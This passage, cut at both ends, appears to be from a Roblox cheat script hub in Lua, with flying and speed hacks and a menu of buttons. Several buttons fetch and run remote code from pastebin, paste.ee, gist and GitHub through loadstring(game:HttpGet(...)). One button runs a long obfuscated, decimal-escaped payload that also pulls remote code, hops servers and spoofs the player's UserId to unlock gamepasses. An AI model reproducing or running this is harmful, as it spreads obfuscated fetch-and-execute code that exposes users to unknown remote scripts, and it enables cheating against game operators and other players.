		local UpperTorso = plr.Character.LowerTorso

		local flying = true

		local deb = true

		local ctrl = {f = 0, b = 0, l = 0, r = 0}

		local lastctrl = {f = 0, b = 0, l = 0, r = 0}

		local maxspeed = 50

		local speed = 0

		local bg = Instance.new("BodyGyro", UpperTorso)

		bg.P = 9e4

		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)

		bg.cframe = UpperTorso.CFrame

		local bv = Instance.new("BodyVelocity", UpperTorso)

		bv.velocity = Vector3.new(0,0.1,0)

		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)

		if nowe == true then

			plr.Character.Humanoid.PlatformStand = true

		end

		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do

			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then

				speed = speed+.5+(speed/maxspeed)

				if speed > maxspeed then

					speed = maxspeed

				end

			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then

				speed = speed-1

				if speed < 0 then

					speed = 0

				end

			end

			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then

				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed

				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}

			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then

				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed

			else

				bv.velocity = Vector3.new(0,0,0)

			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)

		end

		ctrl = {f = 0, b = 0, l = 0, r = 0}

		lastctrl = {f = 0, b = 0, l = 0, r = 0}

		speed = 0

		bg:Destroy()

		bv:Destroy()

		plr.Character.Humanoid.PlatformStand = false

		game.Players.LocalPlayer.Character.Animate.Disabled = false

		tpwalking = false

	

end)

up.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,0)

	

end)

down.MouseButton1Down:connect(function()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-2,0)

end)

game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)

	wait(0.7)

	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false

	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)

plus.MouseButton1Down:connect(function()

	speeds = speeds + 1

	speed.Text = speeds

	if nowe == true then

		

	tpwalking = false

	for i = 1, speeds do

		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	

			tpwalking = true

			local chr = game.Players.LocalPlayer.Character

			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

			while tpwalking and hb:Wait() and chr and hum and hum.Parent do

				if hum.MoveDirection.Magnitude > 0 then

					chr:TranslateBy(hum.MoveDirection)

				end

			end

		end)

		end

		end

end)

mine.MouseButton1Down:connect(function()

	if speeds == 1 then

		speed.Text = 'can not be less than 1'

		wait(1)

		speed.Text = speeds

	else

	speeds = speeds - 1

		speed.Text = speeds

		if nowe == true then

	tpwalking = false

	for i = 1, speeds do

		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	

			tpwalking = true

			local chr = game.Players.LocalPlayer.Character

			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

			while tpwalking and hb:Wait() and chr and hum and hum.Parent do

				if hum.MoveDirection.Magnitude > 0 then

					chr:TranslateBy(hum.MoveDirection)

				end

			end

		end)

		end

		end

		end

end)

end)

Section:NewButton("Animation GUI", "Different Movement", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)

Section:NewButton("RTX Gui 1", "RTX Version 1", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Z6m1aPy1",true))()
end)

Section:NewButton("Fps GUI", "No lag and Thats good", function()
    loadstring("\45\45\45\45\45\32\85\73\32\76\73\66\82\65\82\89\32\45\45\45\45\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\105\107\97\86\51\114\109\47\85\105\76\105\98\47\109\97\115\116\101\114\47\76\105\98\46\108\117\97\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\70\112\115\32\66\111\111\115\116\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\82\101\109\111\118\101\32\80\97\103\101\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\85\32\119\105\108\108\32\112\117\116\32\104\101\114\101\32\121\111\117\114\32\98\117\116\116\111\110\115\44\101\116\99\41\10\10\97\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\50\55\44\32\50\53\53\44\32\50\49\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\97\58\66\117\116\116\111\110\40\34\70\112\115\32\43\56\48\34\44\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\112\114\105\110\116\40\34\104\101\108\108\111\34\41\32\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\87\97\118\101\83\105\122\101\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\87\97\118\101\83\112\101\101\100\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\82\101\102\108\101\99\116\97\110\99\101\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\71\108\111\98\97\108\83\104\97\100\111\119\115\32\61\32\102\97\108\115\101\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\70\111\103\69\110\100\32\61\32\57\101\57\10\9\115\101\116\116\105\110\103\115\40\41\46\82\101\110\100\101\114\105\110\103\46\81\117\97\108\105\116\121\76\101\118\101\108\32\61\32\49\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\85\110\105\111\110\79\112\101\114\97\116\105\111\110\34\41\32\111\114\32\118\58\73\115\65\40\34\77\101\115\104\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\67\111\114\110\101\114\87\101\100\103\101\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\84\114\117\115\115\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\77\97\116\101\114\105\97\108\32\61\32\34\80\108\97\115\116\105\99\34\10\9\9\9\118\46\82\101\102\108\101\99\116\97\110\99\101\32\61\32\48\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\68\101\99\97\108\34\41\32\116\104\101\110\10\9\9\9\118\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\80\97\114\116\105\99\108\101\69\109\105\116\116\101\114\34\41\32\111\114\32\118\58\73\115\65\40\34\84\114\97\105\108\34\41\32\116\104\101\110\10\9\9\9\118\46\76\105\102\101\116\105\109\101\32\61\32\78\117\109\98\101\114\82\97\110\103\101\46\110\101\119\40\48\41\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\69\120\112\108\111\115\105\111\110\34\41\32\116\104\101\110\10\9\9\9\118\46\66\108\97\115\116\80\114\101\115\115\117\114\101\32\61\32\49\10\9\9\9\118\46\66\108\97\115\116\82\97\100\105\117\115\32\61\32\49\10\9\9\101\110\100\10\9\101\110\100\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\66\108\117\114\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\83\117\110\82\97\121\115\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\66\108\111\111\109\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\68\101\112\116\104\79\102\70\105\101\108\100\69\102\102\101\99\116\34\41\32\116\104\101\110\10\9\9\9\118\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\9\101\110\100\10\9\101\110\100\10\9\119\111\114\107\115\112\97\99\101\46\68\101\115\99\101\110\100\97\110\116\65\100\100\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\99\104\105\108\100\41\10\9\9\99\111\114\111\117\116\105\110\101\46\119\114\97\112\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\105\102\32\99\104\105\108\100\58\73\115\65\40\39\70\111\114\99\101\70\105\101\108\100\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\108\115\101\105\102\32\99\104\105\108\100\58\73\115\65\40\39\83\112\97\114\107\108\101\115\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\108\115\101\105\102\32\99\104\105\108\100\58\73\115\65\40\39\83\109\111\107\101\39\41\32\111\114\32\99\104\105\108\100\58\73\115\65\40\39\70\105\114\101\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\110\100\10\9\9\101\110\100\41\40\41\10\9\101\110\100\41\10\101\110\100\41\10\10\97\58\66\117\116\116\111\110\40\34\82\101\109\111\118\101\70\111\103\34\44\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\70\111\103\69\110\100\32\61\32\49\48\48\48\48\48\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\65\116\109\111\115\112\104\101\114\101\34\41\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\112\97\103\101\50\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\85\32\119\105\108\108\32\112\117\116\32\104\101\114\101\32\121\111\117\114\32\98\117\116\116\111\110\115\44\101\116\99\41\10\10\98\58\66\117\116\116\111\110\40\34\98\117\98\98\108\101\99\104\97\116\34\44\102\117\110\99\116\105\111\110\40\41\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\67\104\97\116\34\41\46\66\117\98\98\108\101\67\104\97\116\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\83\101\114\118\101\114\104\111\112\34\44\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\115\101\114\118\101\114\115\32\61\32\110\105\108\10\32\32\32\32\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\115\101\114\118\101\114\115\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\58\74\83\79\78\68\101\99\111\100\101\40\103\97\109\101\58\72\116\116\112\71\101\116\65\115\121\110\99\40\34\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47\34\32\46\46\32\103\97\109\101\46\80\108\97\99\101\73\100\32\46\46\32\34\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48\34\41\41\46\100\97\116\97\10\32\32\32\32\101\110\100\41\10\32\32\32\32\105\102\32\116\121\112\101\40\115\101\114\118\101\114\115\41\32\126\61\32\34\116\97\98\108\101\34\32\116\104\101\110\10\32\32\32\32\101\110\100\10\32\32\32\32\108\111\99\97\108\32\106\111\98\73\100\115\32\61\32\123\125\10\32\32\32\32\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\115\101\114\118\101\114\115\41\32\100\111\10\32\32\32\32\9\105\102\32\116\121\112\101\40\118\41\32\61\61\32\34\116\97\98\108\101\34\32\97\110\100\32\118\46\109\97\120\80\108\97\121\101\114\115\32\62\32\118\46\112\108\97\121\105\110\103\32\97\110\100\32\118\46\105\100\32\126\61\32\103\97\109\101\46\74\111\98\73\100\32\116\104\101\110\10\32\32\32\32\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\106\111\98\73\100\115\44\32\118\46\105\100\41\10\32\32\32\32\9\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\105\102\32\35\106\111\98\73\100\115\32\62\32\48\32\116\104\101\110\10\32\32\32\32\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\34\41\58\84\101\108\101\112\111\114\116\84\111\80\108\97\99\101\73\110\115\116\97\110\99\101\40\103\97\109\101\46\80\108\97\99\101\73\100\44\32\106\111\98\73\100\115\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\106\111\98\73\100\115\41\93\41\10\32\32\32\32\101\110\100\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\70\51\120\34\44\102\117\110\99\116\105\111\110\40\41\10\9\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\54\54\57\53\54\52\52\50\57\57\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\70\114\101\101\32\71\97\109\101\112\97\115\115\34\44\102\117\110\99\116\105\111\110\40\41\10\105\102\32\103\97\109\101\46\67\114\101\97\116\111\114\84\121\112\101\32\61\61\32\69\110\117\109\46\67\114\101\97\116\111\114\84\121\112\101\46\85\115\101\114\32\116\104\101\110\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\32\61\32\103\97\109\101\46\67\114\101\97\116\111\114\73\100\32\101\110\100\32\105\102\32\103\97\109\101\46\67\114\101\97\116\111\114\84\121\112\101\32\61\61\32\69\110\117\109\46\67\114\101\97\116\111\114\84\121\112\101\46\71\114\111\117\112\32\116\104\101\110\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\71\114\111\117\112\83\101\114\118\105\99\101\34\41\58\71\101\116\71\114\111\117\112\73\110\102\111\65\115\121\110\99\40\103\97\109\101\46\67\114\101\97\116\111\114\73\100\41\46\79\119\110\101\114\46\73\100\32\101\110\100\10\101\110\100\41\32\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\32\45\45\32\68\111\110\116\32\82\101\109\111\118\101\32\84\104\105\115\32\70\111\114\32\68\101\115\116\114\111\121\32\84\104\101\32\71\85\73\10\10\45\45\45\32\67\111\109\105\110\103\32\83\111\111\110\32\45\45\45\10\10")()
end)

Section:NewButton("PARADOX GUI", "Cool admin stuff", function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/JLPe0B3H'),true))();
end)

Section:NewButton("Shushi X HUB", "BKHAX HUB KART X(2)", function()
   loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
end)

Section:NewButton("Fe Sussy HUB", "18+ lol", function()
   loadstring(game:HttpGet(('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub'),true))();
end)

Section:NewButton("Moon HUB V3", "Op Hub", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/LwQkm563"))();
end)

Section:NewButton("Replication Ui", "Alot fe", function()
local screenGui = game:GetObjects("rbxassetid://3546404827")[1]
  local mainFrame = screenGui.Frame
    local pages = mainFrame.Pages
      local pageLayout = pages.UIPageLayout
      local pageScripts = pages.Scripts
        local interactiveButton = pageScripts.Character.Elements.TextButton
        local utility = pageScripts.Utility
          local utilityElements = utility.Elements
      local pageOptions = pages.Options
    local titleFrame = mainFrame.Title
    local toolbar = mainFrame.Toolbar

screenGui.LocalScript:Destroy()
screenGui.Parent = game:GetService("CoreGui")
interactiveButton.Parent = nil
mainFrame.Visible = true

gripCenter = CFrame.new(0, 0, 1) * CFrame.Angles(math.rad(90), 0, 0)
offset = CFrame.Angles(0, 0, 0)

_player = {
	p = game:GetService("Players").LocalPlayer;
	b = function()
		return _player.p:FindFirstChild("Backpack")
	end;
	c = function()
		return _player.p.Character
	end;
}
_functions = {
	respawn = function()
		local c = _player.c()
		if workspace:FindFirstChild(_player.p.Name) then 
			spawn(function()
				wait(.5)
				if _player.c() ~= workspace:FindFirstChild(_player.p.Name) then
					workspace:FindFirstChild(_player.p.Name):BreakJoints()
				end
			end)
		end
		if c then
			c:BreakJoints()
			c:ClearAllChildren()
		end
		local newChar = Instance.new("Model", workspace)
		local hum = Instance.new("Humanoid", newChar)
		local torso = Instance.new("Part", newChar)
		newChar.Name = "respawn_"
		torso.Name = "Torso"
		torso.Transparency = 1
		_player.p.Character = newChar
		torso.Name = ""
		torso.CanCollide = false
		newChar:MoveTo(Vector3.new(999999, 999999, 999999))
	end;
	tools = function(int)
		local toolamount = int or 200
		
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local runservice = game:GetService("RunService")
		LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
		local currentamount = #LocalPlayer.Backpack:GetChildren()
		LocalPlayer.Character.Archivable = true
		local tempchar = LocalPlayer.Character:Clone()
		local lastchar = nil
		tempchar.Parent = workspace
		local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
		local renderstepped = runservice.RenderStepped:Connect(function()
		    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
		    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
			   	if tool:IsA("Tool") then
		            tool.Parent = LocalPlayer
		        end
		    end
			for _, char in pairs(workspace:GetChildren()) do
				if char.Name == LocalPlayer.Name and char:FindFirstChildWhichIsA("Humanoid") then
					char.Humanoid.Health = 0
				end
			end
		    LocalPlayer.Character:ClearAllChildren()
		    local char = Instance.new("Model", workspace)
		    Instance.new("Humanoid", char)
		    LocalPlayer.Character = char
		    if lastchar ~= nil then
		        lastchar:Destroy()
		    end
		    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
		    lastchar = char
		end)
		repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 3 - currentamount >= toolamount
		renderstepped:Disconnect()
		repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
		lastchar:Destroy()
		
		utilityElements.Tools.Text = "Done respawning?"
		repeat runservice.RenderStepped:Wait() until utilityElements.Tools.Text == "Load Tools"
		
		for _, tool in pairs(LocalPlayer:GetChildren()) do
		    if tool:IsA("Tool") then
		        tool.Parent = LocalPlayer.Backpack
		    end
		end
		LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
		tempchar:Destroy()
	end;
	load = function()
		local b = _player.b()
		local c = _player.c()
		local grip = function(tool, cf)
			local origin = CFrame.new(cf.p)
			local x, y, z = cf:toEulerAnglesXYZ()
			local new = CFrame.Angles(x, y, z)
			local grip = (origin * new):inverse()
			tool.Grip = grip
		end
		local model = c:WaitForChild("gay") -- stupid name choice from what a few months ago?? i have nothing against it i swear
		local parts = {}
		wait(1)
		
		for i, Model in pairs(c:GetChildren()) do
			if Model:IsA("Model") and Model.Name == "gay" then
				for i, v in pairs(Model:GetDescendants()) do
					if v:IsA("BasePart") then
						v.LocalTransparencyModifier = 1
						if v.Name ~= "Ignore" then
							table.insert(parts, v)
						end
					end
					if not v:IsA("BasePart") and not v:IsA("JointInstance") and not v:IsA("BodyMover") and not v:isA("Humanoid") and not v:IsA("Model") then
						v:Remove()
					end
				end
				Model.ChildAdded:Connect(function(c)
					c.Parent = nil
				end)
			end
		end
		
		for _, part in pairs(parts) do
			local m = Instance.new("BlockMesh", part)
			m.Scale = Vector3.new(0, 0, 0)
		end
		
		local tools = b:GetChildren()
		for i, tool in pairs(tools) do
			if tool.Parent then
				wrap(function()
					tool.Parent = c
					for i, v in pairs(tool:GetDescendants()) do
						if v:IsA("Sound") or v:IsA("TouchTransmitter") then
							v:Destroy()
						elseif v:IsA("BasePart") then
							v.Massless = true
							v.CanCollide = false
						elseif v:IsA("LocalScript") or v:IsA("Script") then
							v:Destroy()
						end
					end
					
					if tool:FindFirstChild("Handle") then
						local handle = tool.Handle
						local fakeHandle = handle:Clone()
						fakeHandle.Name = "FakeHandle"
						fakeHandle.Parent = tool
						local w = Instance.new("Weld", handle)
						w.Part0 = fakeHandle
						w.Part1 = handle
						handle.Size = Vector3.new(0, 0, 0)
					end
					
					tool.Parent = b
				end)
			end
			if (not parts[i]) then
				tools[i] = nil
				tool:Destroy()
			end
		end
		
		wait(.2)
		local amt = #tools
		
		wrap(function()
			local connection1
			
			connection1 = game:GetService("RunService").RenderStepped:Connect(function(step)
				for i = 1, amt do
					local tool = tools[i]
					if parts[i] then
						tool.Parent = b
						tool.Parent = c
					end
				end
				
				if _player.c() ~= c or c:FindFirstChildWhichIsA("Humanoid").Health == 0 then
					connection1:Disconnect()
				end
				
				utilityElements.Replicate.Text = ("Replicate (%dfps)"):format(1/step)
			end)
		end)
		
		local connection2
		connection2 = game:GetService("RunService").Heartbeat:Connect(function()
			for i = 1, amt do
				local tool = tools[i]
				if parts[i] then
					if parts[i].Transparency ~= 1 then
						local p = _cframe.toWorldPoint(parts[i].CFrame) * offset
						grip(tool, p)
					else
						local p = _cframe.toWorldPoint(CFrame.new(0, -250, 0))
						grip(tool, p)
					end
				end
			end
			if _player.c() ~= c or c:FindFirstChildWhichIsA("Humanoid").Health == 0 then
				connection2:Disconnect()
			end
		end)
	end;
}
_cframe = {
	diff = function(a, b)
		return (a:Inverse() * b)
	end;
	toWorldPoint = function(a)
		local arm = _player.c():FindFirstChild('Right Arm') or _player.c():FindFirstChild('RightHand')
		local off = arm.CFrame * gripCenter:Inverse()
		if arm.Name == "RightHand" then
			off = arm.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
		end
		return _cframe.diff(off, a)
	end;
	tween = function(object,style,direction,t,goal)
	    local tweenservice = game:GetService("TweenService")
	    local tweenInfo = TweenInfo.new(t,Enum.EasingStyle[style],Enum.EasingDirection[direction])
	    local tween = tweenservice:Create(object,tweenInfo,goal)
	    tween:Play()
	    return tween
	end;
}
scriptList = {
	Character = {
		['Titan']			= {"rbxassetid://3600286284", "rbxassetid://3070358214"};
		['Winged Titan']	= {"rbxassetid://3593786550", "rbxassetid://3070358214"};
		['Part Surround']	= {"rbxassetid://3546680077", "rbxassetid://3546673786"};
	},
	Mechanical = {
		['Spiderbot']		= {"rbxassetid://3040869607", "rbxassetid://3070355648"};
		['Drone']			= {"rbxassetid://3074236927", "rbxassetid://3074245958"};
		['Noise']			= {"rbxassetid://3193712297", "rbxassetid://3070358314"};
	},
	Aesthetic = {
		['Wings']			= {"rbxassetid://3040946714", "rbxassetid://3070358381"};
		['Tail']			= {"rbxassetid://3041387168", "rbxassetid://3070358314"};
		['Star Glitcher']	= {"rbxassetid://3074734519", "rbxassetid://3074751071"};
		['Tentacles']		= {"rbxassetid://3074817074", "rbxassetid://3074820325"};
	},
	Weapon = {
		['Master Hand']		= {"rbxassetid://3040943596", "rbxassetid://3070358267"};
		['Ravenger']		= {"rbxassetid://3040945482", "rbxassetid://3070358154"};
	},
}
wrap = function(f)
	return coroutine.wrap(f)()
end

if game:GetService("RunService"):IsStudio() then
	guiLib = require(screenGui.GuiLib)
else
	guiLib = loadstring(screenGui.GuiLib.Source)()
end

for title, tbl in pairs(scriptList) do
	local frame = pageScripts[title]
	for name, info in pairs(tbl) do
		local btn = interactiveButton:Clone()
		btn.Name = name
		btn.Text = name
		btn.Parent = frame.Elements
		btn.Icon.Image = info[2]
		
		guiLib.circleInteractive(btn)
		guiLib.colorInteractive(btn)
		
		btn.MouseButton1Click:Connect(function()
			local scr = game:GetObjects(info[1])[1]
			local source = scr.Source
			
			if game:GetService("RunService"):IsStudio() == false then
				for i, v in pairs(scr:GetChildren()) do
					v.Parent = script
				end
				wrap(function()
					local func = loadstring(source)
					spawn(func)
				end)
			else
				scr.Disabled = true
				scr.Parent = _player.c()
				wait(.1)
				scr.Disabled = false
			end
		end)
	end
end

repeat wait() until pageLayout.CurrentPage

guiLib.draggable(mainFrame, titleFrame)
for i, v in pairs(toolbar:GetChildren()) do
	if v:IsA("TextButton") then
		guiLib.circleInteractive(v, 2, 1)
		v.MouseButton1Click:Connect(function()
			pageLayout:JumpTo(pages[v.Name])
		end)
		pageLayout.Changed:Connect(function(p)
			if pageLayout.CurrentPage.Name == v.Name then
				guiLib.tween(v, "Sine", "Out", .5, {BackgroundColor3 = Color3.fromRGB(255, 118, 26)})
			else
				guiLib.tween(v, "Sine", "Out", .5, {BackgroundColor3 = Color3.fromRGB(236, 109, 17)})
			end
		end)
	end
end

for i, v in pairs(utilityElements:GetChildren()) do
	if v:IsA("TextButton") then
		guiLib.circleInteractive(v)
		guiLib.colorInteractive(v)
	end
end

utilityElements.Reset.MouseButton1Click:Connect(function()
	local c = _player.c()
	c.Humanoid.Health = 0
	wait(.55)
	for i, v in pairs(c:GetChildren()) do
		if v:IsA("BackpackItem") then
			v.Parent = _player.b()
			v.Parent = _player.p
		end
	end
	repeat wait() until _player.c() ~= c
	_player.c():WaitForChild("Right Arm")
	wait(.25)
	for i, v in pairs(_player.p:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = _player.b()
		end
	end
end)

utilityElements.Block.MouseButton1Click:Connect(function()
	local c = _player.c()
	for _, v in pairs(c:GetChildren()) do
